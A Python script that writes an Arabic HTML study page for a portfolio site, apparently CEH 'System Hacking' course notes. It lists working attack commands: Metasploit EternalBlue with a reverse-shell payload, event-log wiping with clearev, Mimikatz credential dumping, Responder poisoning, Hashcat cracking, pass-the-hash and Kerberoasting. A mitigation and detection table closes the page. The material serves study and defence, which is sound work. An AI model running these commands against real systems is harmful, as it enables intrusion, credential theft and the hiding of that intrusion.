import re

html_path = r"d:\abdo_portfolio\main\templates\main\modules\system_hacking.html"

content = """
<!-- =======================================================
     CEH MODULE 6: SYSTEM HACKING (DEEP DIVE)
     ======================================================= -->
<div class="meth-content-view" id="meth-content-sys-hack" style="display:none;" dir="rtl">
  
  <div class="cyber-hero">
    <h2 class="hero-title"><span class="hero-icon">💻</span> System Hacking (CEH v12)</h2>
    <p class="hero-tagline">مرحلة السيطرة الكاملة: من كسر الحماية إلى زرع الأبواب الخلفية والتخفي.</p>
    <div class="hero-meta">
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 6</span>
      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">📌</span>
      <h3>المراحل الخمس لاختراق الأنظمة (The 5 Stages)</h3>
    </div>
    <div class="goal-cards-grid" dir="rtl">
      
      <div class="goal-card">
        <div class="goal-icon">🔑</div>
        <h4>1. الحصول على الوصول</h4>
        <div class="goal-subtitle">Gaining Access</div>
        <p>تجاوز آليات الحماية عبر كسر كلمات المرور، هجمات الشبكة (MitM)، أو استغلال الثغرات (Exploits) للوصول الأولي.</p>
      </div>

      <div class="goal-card">
        <div class="goal-icon">⬆️</div>
        <h4>2. تصعيد الصلاحيات</h4>
        <div class="goal-subtitle">Escalating Privileges</div>
        <p>الانتقال من مستخدم عادي إلى (Administrator/SYSTEM) أو (Root) عبر استغلال الـ Misconfigurations أو ثغرات النواة (Kernel).</p>
      </div>

      <div class="goal-card">
        <div class="goal-icon">⚙️</div>
        <h4>3. تنفيذ التطبيقات</h4>
        <div class="goal-subtitle">Executing Applications</div>
        <p>تشغيل برمجيات خبيثة كراصد لوحة المفاتيح (Keyloggers) و (RATs) لجمع المعلومات السرية وتوسيع نطاق السيطرة.</p>
      </div>

      <div class="goal-card">
        <div class="goal-icon">🚪</div>
        <h4>4. الحفاظ على الوصول</h4>
        <div class="goal-subtitle">Maintaining Access</div>
        <p>زرع الـ Backdoors، استخدام الـ Rootkits، و Alternate Data Streams (ADS) لضمان العودة مستقبلاً بأمان.</p>
      </div>

      <div class="goal-card">
        <div class="goal-icon">🧹</div>
        <h4>5. مسح الآثار</h4>
        <div class="goal-subtitle">Clearing Tracks</div>
        <p>حذف أو التلاعب بسجلات النظام (Event Logs) لمنع اكتشاف الاختراق من قبل فرق الـ SOC وأنظمة הـ SIEM.</p>
      </div>

    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">⚔️</span>
      <h3>أسلحة وأوامر الاستغلال المتقدمة (Arsenal & Commands)</h3>
    </div>

    <div class="cyber-card">
      <div class="card-header"><h4>1. استغلال ثغرات النظام (Metasploit)</h4></div>
      <p>يُستخدم إطار عمل Metasploit لاستغلال ثغرات معينة (مثل SMB) وفتح جلسة Meterpreter للتحكم العكسي.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Metasploit Console - EternalBlue (MS17-010)</span></div>
        <pre><code>msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit</code></pre>
      </div>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Meterpreter - مسح الآثار (Clearing Tracks)</span></div>
        <pre><code># مسح كافة سجلات الويندوز (Application, System, Security) لتجنب الاكتشاف
clearev</code></pre>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #f1c40f;">
      <div class="card-header"><h4>2. استخراج الـ Hashes والتذاكر (Mimikatz)</h4></div>
      <p>أداة Mimikatz قادرة على قراءة ذاكرة LSASS واستخراج كلمات المرور، الـ Hashes، وتذاكر Kerberos.</p>
      <div class="tree-container" style="direction:ltr; text-align:left; font-family:'Fira Code', monospace; margin-bottom:15px; background:rgba(0,0,0,0.2); padding:15px; border-radius:8px; border-left:2px solid #f1c40f;">
        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # privilege::debug <span style="color:#94a3b8; font-size:0.85em;">// الحصول على صلاحيات Debug</span></div>
        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # sekurlsa::logonpasswords <span style="color:#94a3b8; font-size:0.85em;">// استخراج Passwords و NTLM Hashes</span></div>
        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # sekurlsa::tickets /export <span style="color:#94a3b8; font-size:0.85em;">// استخراج تذاكر TGT و TGS</span></div>
        <div style="color:#e2e8f0;">mimikatz # kerberos::list <span style="color:#94a3b8; font-size:0.85em;">// عرض تذاكر كيربيروس الحالية في الذاكرة</span></div>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #ff4757;">
      <div class="card-header"><h4>3. اصطياد الـ Hashes عبر الشبكة (Responder)</h4></div>
      <p>يُستخدم في شبكات Windows لاستغلال فشل الـ DNS. عندما يبحث الضحية عن خادم غير موجود، يقوم Responder بتسميم استعلامات (LLMNR/NBT-NS) وإجبار الضحية على المصادقة للحصول على NTLMv2 Hash.</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Responder - Poisoning</span></div>
        <pre><code># الاستماع والتسميم لبروتوكولات الـ NetBIOS و LLMNR
responder -I eth0 -rdw</code></pre>
      </div>
    </div>

    <div class="cyber-card" style="--tool-color: #2ed573;">
      <div class="card-header"><h4>4. كسر التشفير (Hashcat)</h4></div>
      <p>الأداة الأقوى لكسر الـ Hashes باستخدام قدرة كروت الشاشة (GPU).</p>
      <div class="cmd-block">
        <div class="cmd-header"><span class="cmd-lang">Hashcat Modes</span></div>
        <pre><code># NTLM Hash (من استخراج Mimikatz)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# NTLMv2 Hash (المُلتقط عبر Responder)
hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt

# Kerberos 5 TGS-REP (تذاكر Kerberoasting)
hashcat -m 13100 -a 0 kerb_hashes.txt rockyou.txt</code></pre>
      </div>
    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">🧠</span>
      <h3>التقنيات والهجمات المتقدمة (Advanced Techniques)</h3>
    </div>
    
    <div class="mistakes-practices-grid" dir="rtl">
      
      <div class="practice-card bad">
        <div class="card-header"><h4>Pass the Hash (PtH)</h4></div>
        <p>بدلاً من محاولة كسر הـ NTLM Hash كيميائياً، يقوم المهاجم بتمرير الـ Hash ذاته مباشرةً كـ "كلمة مرور شرعية" للمصادقة والدخول على أجهزة أخرى بالشبكة (Lateral Movement).</p>
        <div style="margin-top:10px; background:rgba(0,0,0,0.3); padding:8px; border-radius:4px; font-family:monospace; color:#ff4757; direction:ltr;">
          sekurlsa::pth /user:Admin /domain:local /ntlm:&lt;hash&gt; /run:cmd.exe
        </div>
      </div>

      <div class="practice-card bad">
        <div class="card-header"><h4>Kerberoasting</h4></div>
        <p>يستهدف بروتوكول Kerberos. يطلب المهاجم تذكرة خدمة (TGS) لأي حساب Service Account. يتم تشفير التذكرة بالـ Hash الخاص بحساب الخدمة. يسحب المهاجم التذكرة ويكسرها Offline للحصول على الباسورد.</p>
        <div style="margin-top:10px; background:rgba(0,0,0,0.3); padding:8px; border-radius:4px; font-family:monospace; color:#ff4757; direction:ltr;">
          GetUserSPNs.py target.local/user:pass -request
        </div>
      </div>

      <div class="practice-card bad">
        <div class="card-header"><h4>DLL Hijacking</h4></div>
        <p>يبحث نظام الويندوز عن ملفات הـ DLL بترتيب معين. إذا وضع المهاجم ملف DLL خبيث بنفس الاسم في مجلد يتم البحث فيه قبل مجلد النظام الأساسي، سيتم تشغيله بصلاحيات البرنامج العالية.</p>
      </div>

    </div>
  </div>

  <div class="meth-section">
    <div class="section-header">
      <span class="section-icon">🛡️</span>
      <h3>استراتيجيات الدفاع والحماية (Mitigation & SOC Defense)</h3>
    </div>
    
    <div class="table-wrapper">
      <table class="interactive-table" dir="rtl">
        <thead>
          <tr>
            <th>الهجوم (The Attack)</th>
            <th>الحل التقني (Mitigation Strategy)</th>
            <th>مراقبة السجلات (SOC / Event Logs)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>LLMNR/NBT-NS Poisoning</strong></td>
            <td>إيقاف البروتوكولات تماماً عبر الـ Group Policy (GPO).</td>
            <td>مراقبة حركة البث (Broadcast Traffic) للبروتوكولات 5355 و 137.</td>
          </tr>
          <tr>
            <td><strong>Pass the Hash (PtH)</strong></td>
            <td>تطبيق LAPS لتوليد باسوردات عشوائية ومختلفة لكل Local Admin.</td>
            <td>Event ID `4624` (تسجيل دخول) باستخدام NTLM بدل Kerberos.</td>
          </tr>
          <tr>
            <td><strong>Kerberoasting</strong></td>
            <td>استخدام كلمات مرور معقدة جداً للـ Service Accounts وتفعيل Kerberos Armoring (FAST).</td>
            <td>Event ID `4769` (TGS Request) المتكررة بشكل غير طبيعي.</td>
          </tr>
          <tr>
            <td><strong>Mimikatz & Memory Dumping</strong></td>
            <td>تفعيل Credential Guard وأنظمة EDR متطورة.</td>
            <td>مراقبة الحقن في عملية `lsass.exe` أو طلبات الصلاحيات العالية.</td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

</div>
"""

with open(html_path, "w", encoding="utf-8") as f:
    f.write(content)

print(f"Created {html_path}")
